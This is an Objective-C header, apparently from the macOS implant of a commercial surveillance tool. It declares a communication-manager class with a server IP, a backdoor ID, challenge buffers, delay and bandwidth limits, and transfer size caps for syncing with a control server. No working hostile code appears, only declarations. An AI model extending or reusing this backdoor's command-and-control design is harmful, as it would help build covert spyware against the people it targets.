/*
 * RCSMac - Communication Manager
 *  Here we manage all the communication operations that we might need in order
 *  to communicate with the server
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 22/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMCommunicationManager_h__
#define __RCSMCommunicationManager_h__

#import "RCSMCommon.h"

#define MAX_SOCKET_WAIT_TIME_SEND 30
#define MAX_SOCKET_WAIT_TIME_RECV 30

#define MAX_DOWNLOAD_FILE_SIZE (100 * 1024 * 1024)
#define MAX_UPLOAD_CHUNK_SIZE  (25 *  1024 * 1024)


@interface RCSMCommunicationManager : NSObject
{
@private
  u_int mMinDelay;
  u_int mMaxDelay;
  u_int mBandwidthLimit;
  NSString *mServerIP;
  NSString *mBackdoorID;

@private
  int mByteIndex;
  
@private
  NSInputStream *iStream;
  NSOutputStream *oStream;

@private
  NSMutableData *mChallenge;
  NSData *mTempChallenge;
}

- (id)initWithConfiguration: (NSData *)aConfiguration;
- (void)dealloc;

//- (void)stream: (NSStream *)stream handleEvent: (NSStreamEvent)eventCode;
- (BOOL)performSync;

@end

#endif